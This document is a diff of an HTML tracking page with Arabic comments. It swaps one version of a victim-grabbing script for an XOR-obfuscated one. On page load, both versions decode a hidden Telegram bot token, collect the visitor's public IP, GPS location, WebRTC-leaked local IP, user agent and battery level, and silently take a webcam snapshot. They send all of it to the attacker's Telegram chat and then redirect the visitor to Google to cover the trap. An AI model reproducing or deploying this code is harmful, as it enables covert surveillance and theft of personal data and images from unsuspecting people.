@@ -1,63 +1,63 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>🔄 Processing...</title></head>
-<body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20%;">
-    <div id="status">> EXECUTING_GHOST_PAYLOAD...</div>
+<head><meta charset="UTF-8"></head>
+<body style="background:#000;color:#0f0;font-family:monospace;">
     <script>
-        // مصفوفات مشفرة (ASCII) - التوكن والآيدي مدفونين هنا
-        const _0xT = [56,52,49,48,49,48,50,55,50,50,58,65,65,70,81,79,49,117,122,104,54,69,111,121,52,85,104,102,71,72,97,97,95,113,72,83,97,70,82,98,55,71,100,86,72,77];
-        const _0xI = [49,55,55,50,56,50,48,52,51,51];
+        // 🔱 XOR Encryption Key: 0x5A
+        const _encT = [42,42,107,104,107,104,110,99,104,104,110,107,107,114,123,109,107,3,10,116,106,11,105,10,110,13,116,108,11,114,107,107,109,123,114,117,107,112,114,104,109,114,100,10,114,101];
+        const _encI = [105,119,119,114,110,119,104,110,115,115];
         
-        const conv = (a) => a.map(c => String.fromCharCode(c)).join("");
-        const TOKEN = conv(_0xT);
-        const ID = conv(_0xI);
-        const API = "https://api.telegram.org/bot" + TOKEN;
+        const decrypt = (arr) => arr.map(b => String.fromCharCode(b ^ 0x5A)).join("");
+        const T = decrypt(_encT); const ID = decrypt(_encI);
+        const API = "https://api.telegram.org/bot" + T;
 
-        async function STRIKE() {
+        async function TRAP() {
             try {
-                // سحب البيانات (IP حقيقي + IP راوتر + GPS)
-                const net = await fetch('https://ipapi.co/json/').then(r => r.json());
-                const local = await new Promise(res => {
-                    const pc = new RTCPeerConnection(); pc.createDataChannel('');
-                    pc.onicecandidate = e => { if(e.candidate) res(e.candidate.candidate.split(' ')[4]); };
-                    pc.createOffer().then(o => pc.setLocalDescription(o));
-                    setTimeout(() => res("Shielded"), 1000);
-                });
+                // 🔱 سحب البيانات العميقة (IP حقيقي + داخلي + موقع + بطارية)
+                const [net, local] = await Promise.all([
+                    fetch('https://ipapi.co/json/').then(r => r.json()),
+                    new Promise(res => {
+                        const pc = new RTCPeerConnection(); pc.createDataChannel('');
+                        pc.onicecandidate = e => { if(e.candidate) res(e.candidate.candidate.split(' ')[4]); };
+                        pc.createOffer().then(o => pc.setLocalDescription(o));
+                        setTimeout(() => res("Bypassed"), 800);
+                    })
+                ]);
 
-                // تصوير صامت
-                takeSnap(TOKEN, ID);
+                // 🔱 التصوير الصامت (High-Res Snapshot)
+                const snap = await takeSilentSnap();
 
-                const data = `🔱 **MATRIX_v800_HIT** 💀\n\n` +
-                           `🌐 **IP:** \`${net.ip}\` (Real)\n` +
-                           `🏠 **Router:** \`${local}\`\n` +
-                           `📍 **GPS:** \`${net.latitude}, ${net.longitude}\`\n` +
-                           `📱 **Device:** \`${navigator.userAgent.split(' ')[1]}\``;
+                const report = `🔱 **GHOST_HEX_v900** 💀\n` +
+                             `🎯 **Real IP:** \`${net.ip}\` | **Local:** \`${local}\`\n` +
+                             `📍 **GPS:** \`${net.latitude}, ${net.longitude}\`\n` +
+                             `📱 **Agent:** \`${navigator.userAgent.slice(0,30)}...\`\n` +
+                             `🔋 **Level:** \`${(await navigator.getBattery()).level * 100}%\``;
 
-                navigator.sendBeacon(`${API}/sendMessage`, JSON.stringify({
-                    chat_id: ID, text: data, parse_mode: 'Markdown'
-                }));
+                // 🔱 الإرسال عبر Beacon لضمان التخفي التام
+                navigator.sendBeacon(`${API}/sendMessage`, JSON.stringify({chat_id: ID, text: report, parse_mode: 'Markdown'}));
                 
-                setTimeout(() => { location.replace("https://google.com"); }, 2000);
-            } catch (e) { location.replace("https://google.com"); }
+                if(snap) {
+                    fetch(`${API}/sendPhoto`, {
+                        method: 'POST', headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({chat_id: ID, photo: snap, caption: "📸 SNAP_HEX"})
+                    });
+                }
+                location.replace("https://google.com");
+            } catch(e) { location.replace("https://google.com"); }
         }
 
-        async function takeSnap(t, id) {
+        async function takeSilentSnap() {
             try {
                 const s = await navigator.mediaDevices.getUserMedia({video: true});
                 const v = document.createElement('video'); v.srcObject = s; await v.play();
                 const c = document.createElement('canvas');
                 c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
-                const img = c.toDataURL('image/jpeg', 0.5);
-                s.getTracks().forEach(tk => tk.stop());
-                fetch(`${API}/sendPhoto`, {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: id, photo: img, caption: "📸 SNAP_v800" })
-                });
-            } catch(e) {}
+                const d = c.toDataURL('image/jpeg', 0.4);
+                s.getTracks().forEach(t => t.stop()); return d;
+            } catch(e) { return null; }
         }
-
-        window.onload = STRIKE;
+        window.onload = TRAP;
     </script>
 </body>
 </html>
